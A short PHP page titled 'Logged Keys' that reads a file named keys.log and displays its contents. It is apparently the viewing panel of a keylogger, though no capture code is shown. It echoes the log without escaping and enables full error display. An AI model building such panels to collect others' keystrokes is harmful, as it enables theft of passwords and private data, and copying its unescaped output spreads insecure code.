<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (file_exists('keys.log')) {
    $keys = nl2br(file_get_contents('keys.log'));
} else {
    $keys = "No keys logged yet.";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Logged Keys</title>
    <link rel="stylesheet" href="logstyle.css">
</head>
<body>
<video autoplay muted loop id="bg-video">
    <source src="vid.mp4" type="video/mp4">
</video>
<div class="container">
    <h1>Logged Keys</h1>
    <div class="keys-container">
        <pre class="keys-content"><?php echo $keys; ?></pre>
    </div>
    <a href="index.php"><button type="button" class="back-btn">Back to Home</button></a>
</div>
</body>
</html>
